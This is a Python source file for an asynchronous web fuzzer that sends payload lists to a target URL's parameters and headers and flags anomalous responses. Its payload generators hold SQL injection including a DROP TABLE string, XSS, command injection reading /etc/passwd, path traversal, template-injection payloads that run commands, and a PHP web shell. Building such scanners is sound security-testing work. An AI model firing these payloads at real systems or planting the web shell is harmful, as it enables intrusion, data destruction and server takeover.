"""
Advanced Fuzzing Module

Features:
- Mutation-based fuzzing
- Grammar-based fuzzing
- Smart payload generation
- Technology-specific fuzzing
- Rate limiting and throttling
"""

import asyncio
import aiohttp
import re
import json
import random
import string
import struct
from typing import Dict, Any, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from urllib.parse import quote, urlencode
import logging

logger = logging.getLogger(__name__)


@dataclass
class FuzzResult:
    payload: str
    url: str
    method: str
    status: int
    response_length: int
    response_time: float
    anomaly: bool
    anomaly_type: Optional[str] = None
    response_preview: Optional[str] = None


class AdvancedFuzzer:
    """Advanced fuzzing engine"""

    def __init__(self, rate_limit: int = 50, timeout: int = 10):
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[FuzzResult] = []
        self.baseline: Dict[str, Any] = {}
        self.semaphore = asyncio.Semaphore(rate_limit)

    async def _ensure_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                connector=aiohttp.TCPConnector(ssl=False, limit=self.rate_limit)
            )

    async def _request(self, method: str, url: str, **kwargs) -> Tuple[Optional[str], int, float]:
        await self._ensure_session()
        async with self.semaphore:
            try:
                import time
                start = time.time()
                async with self.session.request(method, url, **kwargs) as resp:
                    text = await resp.text()
                    elapsed = time.time() - start
                    return text, resp.status, elapsed
            except Exception as e:
                return None, 0, 0

    # ==================== PAYLOAD GENERATORS ====================

    def generate_mutation_payloads(self, base: str, count: int = 100) -> List[str]:
        """Generate mutated payloads from a base string"""
        payloads = [base]

        mutations = [
            # Bit flipping
            lambda s: ''.join(chr(ord(c) ^ 1) if random.random() < 0.1 else c for c in s),
            # Byte insertion
            lambda s: s[:random.randint(0, len(s))] + chr(random.randint(0, 255)) + s[random.randint(0, len(s)):],
            # Byte deletion
            lambda s: s[:random.randint(0, len(s)-1)] + s[random.randint(0, len(s)):] if len(s) > 1 else s,
            # Byte replacement
            lambda s: s[:random.randint(0, len(s)-1)] + chr(random.randint(0, 255)) + s[random.randint(0, len(s)):] if len(s) > 0 else s,
            # Case swap
            lambda s: s.swapcase(),
            # Repeat
            lambda s: s * random.randint(2, 5),
            # Truncate
            lambda s: s[:random.randint(1, max(1, len(s)-1))],
            # Null injection
            lambda s: s[:len(s)//2] + '\x00' + s[len(s)//2:],
            # Unicode insertion
            lambda s: s[:len(s)//2] + random.choice(['%00', '%0a', '%0d', '\ufeff', '\u202e']) + s[len(s)//2:],
        ]

        for _ in range(count):
            mutator = random.choice(mutations)
            try:
                mutated = mutator(base)
                if mutated and mutated not in payloads:
                    payloads.append(mutated)
            except:
                pass

        return payloads[:count]

    def generate_format_string_payloads(self) -> List[str]:
        """Generate format string attack payloads"""
        return [
            "%s" * 10,
            "%x" * 20,
            "%n" * 5,
            "%p" * 20,
            "%d" * 20,
            "AAAA%08x.%08x.%08x.%08x",
            "%s%s%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n%n%n",
            "%x%x%x%x%x%x%x%x%x%x",
            "%.1000d",
            "%.10000s",
            "%99999999s",
            "%08x." * 100,
            "AAAA" + "%p" * 50,
        ]

    def generate_buffer_overflow_payloads(self) -> List[str]:
        """Generate buffer overflow payloads"""
        payloads = []

        # Length-based
        for length in [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384]:
            payloads.append("A" * length)
            payloads.append("A" * length + "\x00")
            payloads.append("A" * length + "BBBB")

        # Pattern-based (for offset detection)
        pattern = ""
        for i in range(26):
            for j in range(26):
                for k in range(10):
                    pattern += chr(65 + i) + chr(97 + j) + str(k)
                    if len(pattern) >= 2000:
                        break
                if len(pattern) >= 2000:
                    break
            if len(pattern) >= 2000:
                break
        payloads.append(pattern)

        # Integer overflow
        payloads.extend([
            str(2**31 - 1),  # INT_MAX
            str(2**31),
            str(2**32 - 1),  # UINT_MAX
            str(2**32),
            str(2**63 - 1),  # LONG_MAX
            str(-2**31),    # INT_MIN
            str(-1),
            "0",
            "-0",
            "0x7FFFFFFF",
            "0xFFFFFFFF",
        ])

        return payloads

    def generate_injection_payloads(self, tech: str = None) -> List[str]:
        """Generate injection payloads based on technology"""
        base_payloads = [
            # Generic
            "'", "\"", "`", ";", "|", "&", "$", "\\",
            "{{", "}}", "${", "<%", "%>", "<?", "?>",

            # SQL
            "' OR '1'='1", "' OR ''='", "1' AND '1'='1",
            "'; DROP TABLE users--", "1; SELECT * FROM users",
            "' UNION SELECT NULL--", "-1 OR 1=1",

            # XSS
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",

            # Command Injection
            "; id", "| id", "|| id", "& id", "&& id",
            "`id`", "$(id)", "; cat /etc/passwd",

            # Path Traversal
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",

            # SSTI
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
            "{{config}}", "${T(java.lang.Runtime)}",

            # LDAP
            "*", "*)(&", "*)(objectClass=*)",
            "admin)(&)", "x])(cn=*))(|(cn=",

            # XML/XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]>',
            "<foo>&xxe;</foo>",
        ]

        # Technology-specific additions
        if tech:
            tech_lower = tech.lower()

            if "php" in tech_lower:
                base_payloads.extend([
                    "php://filter/convert.base64-encode/resource=index.php",
                    "<?php system($_GET['c']); ?>",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
                ])

            if "java" in tech_lower or "spring" in tech_lower:
                base_payloads.extend([
                    "${T(java.lang.Runtime).getRuntime().exec('id')}",
                    "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).redirectErrorStream(true).start()}",
                ])

            if "node" in tech_lower or "express" in tech_lower:
                base_payloads.extend([
                    "require('child_process').execSync('id')",
                    "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
                ])

            if "python" in tech_lower or "flask" in tech_lower or "django" in tech_lower:
                base_payloads.extend([
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                    "__import__('os').system('id')",
                ])

        return base_payloads

    def generate_special_characters(self) -> List[str]:
        """Generate special character payloads"""
        return [
            # Null bytes
            "%00", "\x00", "\\x00", "\\0",

            # Newlines
            "%0a", "%0d", "%0a%0d", "\n", "\r", "\r\n",

            # Encoding tricks
            "%u0000", "%uff00", "%c0%00",

            # Unicode
            "\ufeff",  # BOM
            "\u202e",  # RTL override
            "\u0000",  # Null
            "\u00a0",  # Non-breaking space

            # SQL comment variations
            "/**/", "--", "#", "//", "<!--", "-->",

            # HTML encoding
            "&lt;", "&gt;", "&amp;", "&quot;", "&#60;", "&#x3c;",

            # URL encoding
            "%3c", "%3e", "%22", "%27", "%2f", "%5c",

            # Double encoding
            "%253c", "%253e", "%2522", "%2527",
        ]

    # ==================== FUZZING METHODS ====================

    async def establish_baseline(self, url: str, method: str = "GET", **kwargs):
        """Establish baseline response for anomaly detection"""
        responses = []

        for _ in range(3):
            resp, status, elapsed = await self._request(method, url, **kwargs)
            if resp:
                responses.append({
                    "status": status,
                    "length": len(resp),
                    "time": elapsed
                })

        if responses:
            self.baseline = {
                "status": responses[0]["status"],
                "avg_length": sum(r["length"] for r in responses) / len(responses),
                "avg_time": sum(r["time"] for r in responses) / len(responses),
                "length_variance": max(r["length"] for r in responses) - min(r["length"] for r in responses)
            }

    def detect_anomaly(self, status: int, length: int, response_time: float, response: str = None) -> Tuple[bool, Optional[str]]:
        """Detect anomalies in response"""
        if not self.baseline:
            return False, None

        anomalies = []

        # Status code change
        if status != self.baseline["status"] and status not in [200, 301, 302]:
            anomalies.append(f"status_change:{status}")

        # Significant length change (>50% difference)
        length_diff = abs(length - self.baseline["avg_length"])
        if length_diff > self.baseline["avg_length"] * 0.5:
            anomalies.append(f"length_change:{length_diff:.0f}")

        # Time anomaly (>3x baseline)
        if response_time > self.baseline["avg_time"] * 3:
            anomalies.append(f"time_delay:{response_time:.2f}s")

        # Error indicators in response
        if response:
            error_patterns = [
                (r"error|exception|fatal|warning", "error_message"),
                (r"sql|mysql|postgresql|oracle|sqlite", "sql_error"),
                (r"stack\s*trace|traceback", "stack_trace"),
                (r"root:|uid=|gid=", "system_info"),
                (r"<\?php|<\?=", "php_disclosure"),
                (r"49|7777777", "template_eval"),
            ]

            resp_lower = response.lower()
            for pattern, anomaly_type in error_patterns:
                if re.search(pattern, resp_lower):
                    anomalies.append(anomaly_type)

        if anomalies:
            return True, ";".join(anomalies)

        return False, None

    async def fuzz_parameter(
        self,
        url: str,
        param: str,
        payloads: List[str],
        method: str = "GET"
    ) -> List[FuzzResult]:
        """Fuzz a single parameter"""
        results = []

        # Establish baseline
        base_url = f"{url}?{param}=test"
        await self.establish_baseline(base_url, method)

        for payload in payloads:
            if method == "GET":
                test_url = f"{url}?{param}={quote(payload)}"
                resp, status, elapsed = await self._request(method, test_url)
            else:
                resp, status, elapsed = await self._request(
                    method, url,
                    data={param: payload}
                )

            if resp is None:
                continue

            anomaly, anomaly_type = self.detect_anomaly(status, len(resp), elapsed, resp)

            result = FuzzResult(
                payload=payload[:100],
                url=url,
                method=method,
                status=status,
                response_length=len(resp),
                response_time=elapsed,
                anomaly=anomaly,
                anomaly_type=anomaly_type,
                response_preview=resp[:200] if anomaly else None
            )

            results.append(result)

            if anomaly:
                logger.info(f"Anomaly detected: {payload[:50]} -> {anomaly_type}")

        return results

    async def fuzz_headers(self, url: str, payloads: List[str]) -> List[FuzzResult]:
        """Fuzz HTTP headers"""
        results = []
        headers_to_fuzz = [
            "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
            "Host", "Accept", "Accept-Language", "Cookie", "Authorization",
            "X-Custom-Header", "X-Original-URL", "X-Rewrite-URL"
        ]

        await self.establish_baseline(url)

        for header in headers_to_fuzz:
            for payload in payloads[:20]:  # Limit payloads per header
                headers = {header: payload}
                resp, status, elapsed = await self._request("GET", url, headers=headers)

                if resp is None:
                    continue

                anomaly, anomaly_type = self.detect_anomaly(status, len(resp), elapsed, resp)

                if anomaly:
                    results.append(FuzzResult(
                        payload=f"{header}: {payload[:50]}",
                        url=url,
                        method="GET",
                        status=status,
                        response_length=len(resp),
                        response_time=elapsed,
                        anomaly=True,
                        anomaly_type=anomaly_type,
                        response_preview=resp[:200]
                    ))

        return results

    # ==================== FULL FUZZ ====================

    async def full_fuzz(
        self,
        url: str,
        params: List[str] = None,
        technologies: List[str] = None
    ) -> List[FuzzResult]:
        """Run comprehensive fuzzing"""
        await self._ensure_session()
        all_results = []

        # Generate payloads
        payloads = []
        payloads.extend(self.generate_injection_payloads(technologies[0] if technologies else None))
        payloads.extend(self.generate_format_string_payloads())
        payloads.extend(self.generate_buffer_overflow_payloads()[:20])
        payloads.extend(self.generate_special_characters())
        payloads.extend(self.generate_mutation_payloads("test", 50))

        # Deduplicate
        payloads = list(set(payloads))
        logger.info(f"Generated {len(payloads)} unique payloads")

        # Fuzz parameters
        if params:
            for param in params:
                logger.info(f"Fuzzing parameter: {param}")
                results = await self.fuzz_parameter(url, param, payloads)
                all_results.extend(results)

        # Fuzz headers
        logger.info("Fuzzing headers...")
        results = await self.fuzz_headers(url, payloads[:50])
        all_results.extend(results)

        # Filter to anomalies only
        anomalies = [r for r in all_results if r.anomaly]
        logger.info(f"Found {len(anomalies)} anomalies out of {len(all_results)} requests")

        self.results = all_results
        return anomalies
